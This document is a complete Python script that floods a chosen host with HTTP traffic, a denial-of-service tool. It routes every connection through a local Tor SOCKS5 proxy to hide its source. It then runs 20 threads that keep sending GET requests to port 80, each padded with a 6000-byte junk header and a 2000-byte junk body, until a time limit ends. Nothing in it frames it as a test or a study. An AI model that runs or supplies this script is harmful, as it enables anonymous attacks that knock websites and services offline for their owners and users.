import socket
import socks
import random
import threading
import sys
import time

socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050)

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0",
]

COUNT = 20
TIMEOUT = 5

def worker(ip, i, stop_event):
    while not stop_event.is_set():
        try:
            sock = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(TIMEOUT)
            sock.connect((ip, 80))

            headers = f"GET /?{random.randint(0, 1500)} HTTP/1.1\r\n"
            headers += f"Host: {ip}\r\n"
            headers += f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
            headers += "X-Custom-Header: " + "A" * 6000 + "\r\n"
            headers += "\r\n"

            payload = "payload=" + "B" * 2000

            request = headers + payload

            sock.send(request.encode("utf-8"))
            response = sock.recv(1024)
            print(f"Thread {i} received: {response}")
        except Exception as e:
            print(f"Error in thread {i}: {e}")

def main(ip, time_limit):
    print(f"Connecting to {ip} with {COUNT} threads for {time_limit} seconds.")

    stop_event = threading.Event()
    threads = []
    for i in range(COUNT):
        thread = threading.Thread(target=worker, args=(ip, i, stop_event))
        threads.append(thread)
        thread.start()

    time.sleep(time_limit)
    stop_event.set()

    print("Time limit reached. Stopping threads.")
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: python3 {sys.argv[0]} example.com seconds")
        sys.exit()

    ip = sys.argv[1]
    time_limit = int(sys.argv[2])

    main(ip, time_limit)
